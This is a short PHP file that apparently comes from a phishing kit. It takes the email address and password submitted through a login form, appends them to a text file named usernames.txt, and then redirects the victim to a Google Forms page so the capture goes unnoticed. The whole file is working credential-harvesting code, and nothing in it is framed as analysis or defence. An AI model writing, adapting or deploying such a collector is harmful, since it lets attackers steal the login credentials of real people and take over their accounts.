<?php
include 'ip.php';

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://forms.gle/2mopguAVtagAPSw48');
exit();
